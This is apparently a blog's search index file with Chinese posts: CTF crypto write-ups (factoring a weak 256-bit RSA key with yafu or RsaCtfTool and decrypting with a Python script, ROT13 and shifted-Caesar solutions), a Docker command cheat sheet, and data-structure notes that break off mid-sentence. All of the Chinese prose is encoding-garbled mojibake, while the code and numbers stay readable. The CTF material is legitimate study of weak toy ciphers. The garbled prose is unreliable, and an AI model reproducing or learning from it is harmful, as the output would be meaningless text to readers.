<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[BUUCTF]rsa</title>
    <url>/2022/01/25/%5BCrypto%5Drsa/</url>
    <content><![CDATA[<p>ç»™äº†ä¸¤ä¸ªæ–‡ä»¶, ä¸€ä¸ªåŠ å¯†åçš„æ–‡ä»¶, ä¸€ä¸ª<code>å…¬é’¥</code>,
å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ç”¨<code>å…¬é’¥</code>å»è§£å¯†<code>ç§é’¥</code>åŠ å¯†çš„æ–‡ä»¶,
ä½†æ˜¯å¾ˆå¤šåŠ å¯†åº“éƒ½æ²¡æœ‰æä¾›è¿™æ ·çš„åŠŸèƒ½, æ¯”å¦‚<code>OpenSSL</code>,
åªæœ‰ç”¨<code>å…¬é’¥</code>éªŒç­¾çš„åŠŸèƒ½.
çœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“è¿™ä¸ªé¢˜æ˜¯åˆ†è§£å…¬é’¥çš„<code>æ¨¡</code>æ¥å®ç°ç®—å‡º<code>ç§é’¥</code>å†è¿›è¡Œè§£å¯†.</p>
<p>ç”¨<code>OpenSSL</code>å¯ä»¥æŸ¥çœ‹<code>å…¬é’¥</code>çš„ä¸€äº›ä¿¡æ¯</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251321659.png"
alt="image-20220125132123596" />
<figcaption aria-hidden="true">image-20220125132123596</figcaption>
</figure>
<p>æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ <span class="math display">\[
\begin{aligned}
&amp;e=65537\\
&amp;n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD
\end{aligned}
\]</span></p>
<p>è€Œä¸”<code>å…¬é’¥</code>æ¯”å¸¸è§çš„è¦çŸ­å¾ˆå¤š, åªæœ‰<code>256Bit</code>,
è¿™ä¸ºæ”»å‡»æä¾›äº†æ–¹ä¾¿</p>
<p>ä¸€äº›åˆ†è§£<code>æ¨¡</code>çš„å·¥å…·:</p>
<blockquote>
<p>RsaCtfTool: <a
href="https://github.com/Ganapati/RsaCtfTool">Github</a>
//è¿™ä¸ªå·¥å…·ä¸æ”¯æŒWindows</p>
<p>yafu: <a
href="https://sourceforge.net/projects/yafu/">Sourceforge</a></p>
<p>Msieve: <a
href="https://sourceforge.net/projects/msieve/">Sourceforge</a></p>
</blockquote>
<p><code>yafu</code>æ–¹å¼, è¿è¡Œåè¿›å…¥<code>yafu</code>å‘½ä»¤è¡Œ, è¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">factor(0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD)</span><br></pre></td></tr></table></figure>
<p>å³å¯å¼€å§‹åˆ†è§£</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251401490.png"
alt="image-20220125140140434" />
<figcaption aria-hidden="true">image-20220125140140434</figcaption>
</figure>
<p><code>RsaCtfTool</code>æ–¹å¼, å®‰è£…å¥½åè¾“å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RsaCtfTool.py -n 0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD -e 65537 --private --dumpkey</span><br></pre></td></tr></table></figure>
<p>å·¥å…·å°±ä¼šç»¼åˆåˆ¤æ–­è‡ªåŠ¨é‡‡ç”¨åˆé€‚çš„æ–¹å¼å¾—å‡ºç§é’¥(ä¹Ÿå¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªå·¥å…·è§£å¯†æ–‡ä»¶,
è¯¦ç»†ç”¨æ³•è§Github)</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251408520.png"
alt="image-202201251408520" />
<figcaption aria-hidden="true">image-202201251408520</figcaption>
</figure>
<p><code>RsaCtfTool</code>å·²ç»å¸®æˆ‘ä»¬ç”Ÿæˆå¥½äº†<code>ç§é’¥</code>,
å¦‚æœæ˜¯ç”¨<code>yafu</code>çš„è¯è¿˜éœ€è¦è®¡ç®—ä¸€ä¸‹<code>d</code></p>
<p>æˆ‘ä»¬å·²ç»å¾—å‡º <span class="math display">\[
\begin{aligned}
&amp;p=285960468890451637935629440372639283459 \\
&amp;q=304008741604601924494328155975272418463
\end{aligned}
\]</span></p>
<p>æœ‰äº†<span class="math inline">\(p\)</span>å’Œ<span
class="math inline">\(q\)</span>å°±å¯ä»¥è½»æ¾æ±‚å‡º<code>æ¬§æ‹‰å‡½æ•°</code>çš„å€¼</p>
<p><span
class="math display">\[\phi(n)=\phi(p)\times\phi(q)=(p-1)\times(q-1)\]</span></p>
<p>æ ¹æ®å…¬å¼ <span class="math inline">\(ed\equiv1(\mod\phi(n))\)</span>,
åˆ™<code>d</code>æ˜¯<code>e</code>æ¨¡<span
class="math inline">\(\phi(n)\)</span>çš„<code>æ¨¡é€†å…ƒ</code>,
<code>Python</code>å¯ä»¥é€šè¿‡<code>gmpy2</code>è¿™ä¸ªåº“æ¥æ±‚å¾—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="comment">#æ­¤é¢˜çš„å¯†æ–‡å¹¶éPKCS1_OAEPå¡«å……æ–¹å¼</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)                 <span class="comment">#æ±‚æ¬§æ‹‰å‡½æ•°å€¼</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi_n))     <span class="comment">#æ±‚æ¨¡é€†å…ƒd</span></span><br><span class="line"></span><br><span class="line">private_key = RSA.construct((n,e,d,p,q))    <span class="comment">#ç”¨å‚æ•°æ„é€ ç§é’¥</span></span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)        <span class="comment">#ç”¨ç§é’¥ç”Ÿæˆä¸€ä¸ªCipher</span></span><br><span class="line">ciphertext = <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">plaintext = cipher.decrypt(ciphertext, <span class="literal">None</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#flag&#123;decrypt_256&#125;</span></span><br></pre></td></tr></table></figure>
<del>
è¯è¯´BUUä¸ºä»€ä¹ˆæŠŠè¿™ä¸ªé¢˜æ”¾åˆ°Reverseæ¿å—é‡Œé¢å‘¢ğŸ¤¨
</del>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>RSA</tag>
        <tag>éå¯¹ç§°åŠ å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]çœ‹æˆ‘å›æ—‹è¸¢</title>
    <url>/2021/11/02/%5BCrypto%5D%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/</url>
    <content><![CDATA[<p>é¢˜ç›®å°±æ˜¯ä¸€æ®µå¯†æ–‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111021552174.png"
alt="img-202111021552174" />
<figcaption aria-hidden="true">img-202111021552174</figcaption>
</figure>
<p>çœ‹è¿™æ ¼å¼, å¤§èƒ†çš„çŒœæµ‹, è¿™å°±æ˜¯ç»è¿‡æŸç§å˜æ¢åçš„<strong>flag</strong></p>
<p>è¿™<code>synt</code>è‡ªç„¶å°±æ˜¯å°±æ˜¯<code>flag</code>å˜æ¢æ¥çš„äº†,
é‚£æ˜¯æ€ä¹ˆå˜æ¢æ¥çš„å‘¢? æˆ‘ä»¬å¯ä»¥å…ˆè‡ªå·±å¯¹æ¯”ä¸€ä¸‹<code>ASCII</code>ç ,
çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°è§„å¾‹, å°±æ‹¿"synt"å’Œ"flag"å¯¹æ¯”, å†™ä¸ªè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;synt&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[115, 121, 110, 116]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
<p>æ˜¾è€Œæ˜“è§, å¯†æ–‡å°±æ˜¯æŠŠæ˜æ–‡çš„å­—ç¬¦çš„<code>ASCII</code>ç é€ä¸ªåŠ +13å¾—æ¥çš„,
é‚£ä¹ˆå†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span>:</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flagn(cd$##&#x27;d +)a( &#x27;)d+ b*%# beb(ba#&#x27;$*e$p</span></span><br></pre></td></tr></table></figure>
<p>? ? ?</p>
<p>ä»€ä¹ˆé¬¼?! è¿™æ˜¾ç„¶æ˜¯é”™çš„,
çœ‹æ ·å­ä¸èƒ½å•çº¯åœ¨<code>ASCII</code>ç ä¸Š+13å°±å®Œäº‹äº†</p>
<p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾, å¾—çŸ¥æ­¤é¢˜çš„å˜æ¢æ–¹å¼æ–¹å¼ç§°ä¸º<strong>ROT13(Rotate by 13
places; å›è½¬13ä½)</strong></p>
<blockquote>
<p><code>ROT13</code>å’Œå®ƒçš„å…„å¼Ÿä»¬:</p>
<p><strong>ROT5</strong>: åªå¯¹æ•°å­—è¿›è¡Œç¼–ç ,
ç”¨å½“å‰æ•°å­—å¾€å‰æ•°çš„ç¬¬5ä¸ªæ•°å­—æ›¿æ¢å½“å‰æ•°å­—, ä¾‹å¦‚å½“å‰ä¸º<code>0</code>,
ç¼–ç åå˜æˆ<code>5</code>, å½“å‰ä¸º<code>1</code>,
ç¼–ç åå˜æˆ<code>6</code>, ä»¥æ­¤ç±»æ¨é¡ºåºå¾ªç¯.</p>
<p><strong>ROT13</strong>: åªå¯¹å­—æ¯è¿›è¡Œç¼–ç ,
ç”¨å½“å‰å­—æ¯å¾€å‰æ•°çš„ç¬¬13ä¸ªå­—æ¯æ›¿æ¢å½“å‰å­—æ¯, ä¾‹å¦‚å½“å‰ä¸º<code>A</code>,
ç¼–ç åå˜æˆ<code>N</code>, å½“å‰ä¸º<code>B</code>,
ç¼–ç åå˜æˆ<code>O</code>, ä»¥æ­¤ç±»æ¨é¡ºåºå¾ªç¯.</p>
<p><strong>ROT18</strong>: è¿™æ˜¯ä¸€ä¸ªå¼‚ç±», æœ¬æ¥æ²¡æœ‰,
å®ƒæ˜¯å°†ROT5å’ŒROT13ç»„åˆåœ¨ä¸€èµ·, ä¸ºäº†å¥½ç§°å‘¼, å°†å…¶å‘½åä¸ºROT18.</p>
<p><strong>ROT47</strong>: å¯¹æ•°å­—ã€å­—æ¯ã€å¸¸ç”¨ç¬¦å·è¿›è¡Œç¼–ç ,
æŒ‰ç…§å®ƒä»¬çš„<code>ASCII</code>ç è¿›è¡Œä½ç½®æ›¿æ¢,ç”¨å½“å‰å­—ç¬¦<code>ASCII</code>ç å¾€å‰æ•°çš„ç¬¬47ä½å¯¹åº”å­—ç¬¦æ›¿æ¢å½“å‰å­—ç¬¦,
ä¾‹å¦‚å½“å‰ä¸ºå°å†™å­—æ¯<code>z</code>, ç¼–ç åå˜æˆå¤§å†™å­—æ¯<code>K</code>,
å½“å‰ä¸ºæ•°å­—<code>0</code>, ç¼–ç åå˜æˆç¬¦å·<code>_</code>,
ç”¨äºROT47ç¼–ç çš„å­—ç¬¦å…¶<code>ASCII</code>ç èŒƒå›´æ˜¯33ï¼126, å…·ä½“å¯å‚è€ƒ<a
href="http://c.biancheng.net/c/ascii/">ASCIIç ä¸€è§ˆè¡¨</a>.</p>
</blockquote>
<p>æ‰€ä»¥è¿™é¢˜æ­£ç¡®çš„è§£å¯†æ–¹å¼å°±æ˜¯æŠŠå­—æ¯(<strong>é™¤å­—æ¯å¤–çš„å­—ç¬¦ä¿æŒä¸å˜</strong>)ç§»+13ä½,
åˆ°äº†æœ«å°¾åˆä»å¤´å¾ªç¯,
é‚£ä¹ˆæˆ‘ä»¬åªè¦ä»¿ç…§è¿™ä¸ªåŸç†å†™å‡ºè§£å¯†è„šæœ¬åº”è¯¥å°±æ²¡é—®é¢˜äº†.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">myChar, offset</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(myChar) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+(offset%<span class="number">26</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &gt; <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)-<span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &lt; <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+<span class="number">26</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= <span class="built_in">ord</span>(myChar) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+(offset%<span class="number">26</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &gt; <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)-<span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &lt; <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+<span class="number">26</span>)</span><br><span class="line">    <span class="keyword">return</span> myChar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += shift(ciphertext[i], <span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>å¤å…¸å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]å˜å¼‚å‡¯æ’’</title>
    <url>/2021/11/02/%5BCrypto%5D%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/</url>
    <content><![CDATA[<p>é¢˜ç›®: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ å¯†å¯†æ–‡ï¼šafZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">çŒœæµ‹æ˜æ–‡ï¼šflag&#123;...&#125;</span><br></pre></td></tr></table></figure></p>
<p>çœ‹æ ‡é¢˜, <strong>å˜å¼‚å‡¯æ’’</strong>,
æƒ³å¿…è¿™é¢˜å°±æ˜¯åŸºäºå‡¯æ’’å¯†ç å»¶ä¼¸å‡ºæ¥çš„, æœ‰äº†ä¸Šæ¬¡çš„ç»éªŒ,
æˆ‘ä»¬å†æŠŠè¿™ä¸ªå­—ç¬¦çš„<code>ASCII</code>ç æ‹¿æ¥å¯¹æ¯”ä¸€ä¸‹,
å¯†æ–‡ä¸å¤–ä¹åˆæ˜¯ä¸€äº›ç§»ä½å˜æ¢å‡ºæ¥çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[97, 102, 90, 95, 114, 57, 86, 89, 102, 83, 99, 79...]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°, å¯†æ–‡çš„å‰4ä½çš„<code>ASCII</code>ç æ¯” "flag"
è¿™4ä¸ªå­—ç¬¦ä»ç¬¬1ä½èµ·ä¾æ¬¡å¤§äº†5, 6, 7, 8, åé¢çš„ä»¥æ­¤ç±»æ¨.
å†™å‡ºè§£å¯†è„šæœ¬å³å¯æ‹¿åˆ°<strong>flag</strong>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])+(<span class="number">5</span>+i))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Caesar_variation&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>å¤å…¸å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸è§CLIå·¥å…·ä½¿ç”¨é€ŸæŸ¥</title>
    <url>/2023/03/31/%5BNote%5D%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E9%80%9F%E6%9F%A5/</url>
    <content><![CDATA[<h2 id="dockerå¸¸ç”¨æŒ‡ä»¤åŠå‚æ•°">Dockerå¸¸ç”¨æŒ‡ä»¤åŠå‚æ•°</h2>
<p><code>docker [OPTIONS] COMMAND</code></p>
<ul>
<li><p><code>search [OPTIONS] TERM</code>: æœç´¢é•œåƒ,
æ¯”å¦‚<code>sudo docker search httpd</code>.</p></li>
<li><p><code>pull [OPTIONS] NAME[:TAG|@DIGEST]</code>: æ‹‰å–æŒ‡å®šé•œåƒ,
æ¯”å¦‚<code>docker pull ubuntu:20.04.</code></p></li>
<li><p><code>images</code>: åˆ—å‡ºæœ¬åœ°çš„é•œåƒ.</p></li>
<li><p><code>attach [OPTIONS] CONTAINER</code>: é™„åŠ åˆ°æŸä¸ªå®¹å™¨,
æ¯”å¦‚åˆšé€šè¿‡<code>CTRL+P+Q</code>ä»å®¹å™¨ä¸­é€€å‡º,
å†é€šè¿‡<code>attach</code>é™„åŠ å›å».</p></li>
<li><p><code>exec [OPTIONS] CONTAINER COMMAND [ARG...]</code>:
åœ¨å®¹å™¨å†…æ‰§è¡ŒæŒ‡ä»¤, é€šå¸¸ç”¨äºå¼€å¯<code>bash</code></p>
<ul>
<li><code>--privileged</code>: ç»™äºˆå®¹å™¨çœŸæ­£çš„<code>root</code>æƒé™.</li>
<li><code>-u</code>: æŒ‡å®šæ‰§è¡Œçš„ç”¨æˆ·.</li>
<li><code>-w</code>: æŒ‡å®šå·¥ä½œç›®å½•.</li>
<li><code>-t</code>: åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯,
ç”¨äºæ‰§è¡Œ<code>bash</code>ç­‰äº¤äº’å¼CLIç¨‹åº.</li>
<li><code>-i</code>: ä¿æŒå®¹å™¨çš„<code>stdin</code>å¼€å¯,
ä½¿å®¹å™¨èƒ½å¤Ÿæ¥å—å¤–éƒ¨è¾“å…¥, æ­é…<code>-i</code>ä½¿ç”¨.</li>
<li><code>-d</code>: åå°è¿è¡Œ, ä¸è¿›å…¥å®¹å™¨. åå°å®¹å™¨å¯ä»¥ä½¿ç”¨
<code>attach</code>æ¥è¿›å…¥.</li>
</ul></li>
<li><p><code>container COMMAND</code></p>
<ul>
<li><code>prune</code>: æ¸…é™¤æ‰€æœ‰å·²åœæ­¢çš„å®¹å™¨.</li>
<li><code>ls</code>: åˆ—å‡ºå®¹å™¨, é»˜è®¤æ˜¯æ­£åœ¨è¿è¡Œçš„å®¹å™¨,
åŠ ä¸Š<code>-a</code>åˆ—å‡ºæ‰€æœ‰å®¹å™¨.</li>
</ul></li>
<li><p><code>run [OPTIONS] IMAGE [COMMAND] [ARG...]</code></p>
<blockquote>
<p><code>exec</code>çš„å‚æ•°å’Œ<code>run</code>çš„å‚æ•°æ˜¯é‡åˆçš„,
è¿™é‡Œåªå†™äº†å’Œ<code>exec</code>ä¸ä¸€æ ·çš„å‚æ•°.</p>
</blockquote>
<ul>
<li><code>-p</code>: è®¾ç½®ç«¯å£æ˜ å°„,
æ¯”å¦‚å°†å®¿ä¸»æœºçš„80ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„80ç«¯å£, ä½¿ç”¨<code>-p 80:80</code>.</li>
<li><code>-v</code>: æŒ‚è½½å®¿ä¸»æœºç›®å½•åˆ°å®¹å™¨å†…,
ä¿è¯å®¹å™¨é”€æ¯æ•°æ®ä¸ä¸¢å¤±å¹¶å®ç°æ–¹ä¾¿çš„é…ç½®.
ä¾‹å¦‚<code>-v /home/x2658y/wwwroot:/usr/local/apache2/htdocs</code>å®ç°å°†å®¿ä¸»æœºçš„ç½‘ç«™ç›®å½•æ˜ å°„åˆ°å®¹å™¨çš„ç½‘ç«™æ ¹ç›®å½•é‡Œ,
æ— éœ€è¿›å…¥å®¹å™¨å’Œè¿›è¡Œæ‹·è´.</li>
<li><code>--name</code>: å–åå­—, ä¾¿äºè¿›è¡Œæ“ä½œ, ç­‰æ•ˆäºå®¹å™¨ID.</li>
<li><code>--net</code>: è®¾ç½®ç½‘ç»œæ¨¡å¼, å¯å–<code>host</code>,
<code>container</code>, <code>bridge</code>, <code>none</code>.
<code>host</code>æ¨¡å¼å¯ä»¥ä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ, æ— éœ€ç«¯å£æ˜ å°„,
<code>container</code>æ¨¡å¼å¯ä»¥ä¸å¦ä¸€ä¸ªå®¹å™¨å…±äº«ç½‘ç»œ, é»˜è®¤æ¨¡å¼æ˜¯
<code>bridge</code>, å®¿ä¸»æœºè®¿é—®å®¹å™¨éœ€è¦è¿›è¡Œç«¯å£æ˜ å°„.</li>
</ul></li>
<li><p><code>ps [OPTIONS]</code>: åˆ—å‡ºå®¹å™¨, <code>-a</code>æ˜¾ç¤ºæ‰€æœ‰å®¹å™¨,
é»˜è®¤åªæ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„.</p></li>
<li><p><code>rm [OPTIONS] CONTAINER [CONTAINER...]</code>:
åˆ é™¤å·²åœæ­¢çš„å®¹å™¨, <code>-f</code>å¯ä»¥å¼ºè¡Œåˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨.</p></li>
<li><p><code>start [OPTIONS] CONTAINER [CONTAINER...]</code>:
å¯åŠ¨å®¹å™¨</p>
<blockquote>
<p>æ²¡æœ‰<code>-t</code>é€‰é¡¹,
ä¼ªç»ˆç«¯ç”±<code>run</code>æˆ–è€…<code>exec</code>æ¥åˆ†é….</p>
</blockquote>
<ul>
<li><code>-a</code>: é™„åŠ åˆ°å¼€å¯çš„å®¹å™¨.</li>
<li><code>-i</code>: å¼€å¯<code>stdin</code>, ä½¿å®¹å™¨èƒ½å¤Ÿæ¥å—è¾“å…¥.</li>
</ul></li>
<li><p><code>restart [OPTIONS] CONTAINER [CONTAINER...]</code>:
é‡å¯å®¹å™¨, é‡å¯ååœ¨åå°è¿è¡Œ.</p></li>
<li><p><code>stop [OPTIONS] CONTAINER [CONTAINER...]</code>:
åœæ­¢è¿è¡Œå®¹å™¨, æ­£å¸¸åœæ­¢.</p></li>
<li><p><code>kill [OPTIONS] CONTAINER [CONTAINER...]</code>: æ€æ­»å®¹å™¨,
å¼ºè¡Œåœæ­¢.</p></li>
</ul>
<blockquote>
<p>æœªå®Œå¾…ç»­</p>
</blockquote>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>Docker</tag>
        <tag>TShark</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®ç»“æ„å­¦ä¹ ç¬”è®°</title>
    <url>/2023/03/25/%5BNote%5D%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ç»ªè®º">ç»ªè®º</h2>
<h3 id="ç®—æ³•çš„å®šä¹‰">ç®—æ³•çš„å®šä¹‰</h3>
<p>è§£å†³ç‰¹å®šé—®é¢˜æ±‚è§£æ­¥éª¤çš„æè¿°ï¼Œåœ¨è®¡ç®—æœºä¸­è¡¨ç°ä¸ºæŒ‡ä»¤çš„æœ‰é™åºåˆ—ï¼Œå¹¶ä¸”æ¯æ¡æŒ‡ä»¤è¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ“ä½œã€‚</p>
<h3 id="ç®—æ³•çš„ç‰¹æ€§">ç®—æ³•çš„ç‰¹æ€§</h3>
<ul>
<li>æœ‰é™æ€§: ä¸€ä¸ªç®—æ³•å¿…é¡»ä¿è¯æ‰§è¡Œæœ‰é™æ­¥ä¹‹åç»“æŸ.</li>
<li>ç¡®åˆ‡æ€§: ä¸€ä¸ªç®—æ³•çš„æ¯ä¸€æ­¥éª¤å¿…é¡»æœ‰ç¡®åˆ‡çš„å®šä¹‰.</li>
<li>è¾“å…¥: ä¸€ä¸ªç®—æ³•æœ‰é›¶ä¸ªæˆ–å¤šä¸ªè¾“å…¥, ä»¥åˆ»ç”»è¿ç®—å¯¹è±¡çš„åˆå§‹æƒ…å†µ,
æ‰€è°“é›¶ä¸ªè¾“å…¥æ˜¯æŒ‡ç®—æ³•æœ¬èº«ç»™å®šäº†åˆå§‹æ¡ä»¶.</li>
<li>è¾“å‡º: ä¸€ä¸ªç®—æ³•æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡º. æ²¡æœ‰è¾“å‡ºçš„ç®—æ³•æ¯«æ— æ„ä¹‰.</li>
<li>å¯è¡Œæ€§:
ä¸€ä¸ªç®—æ³•çš„ä»»ä½•è®¡ç®—æ­¥éª¤éƒ½æ˜¯å¯ä»¥è¢«åˆ†è§£ä¸ºåŸºæœ¬å¯æ‰§è¡Œçš„æ“ä½œï¼Œæ¯ä¸ªæ“ä½œéƒ½èƒ½å¤Ÿåœ¨æœ‰é™æ—¶é—´å†…å®Œæˆ.</li>
</ul>
<h3 id="ç®—æ³•çš„è®¾è®¡è¦æ±‚">ç®—æ³•çš„è®¾è®¡è¦æ±‚</h3>
<p>ç®—æ³•è®¾è®¡ä¸€èˆ¬è¦æ±‚æ»¡è¶³ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<p><strong>1.
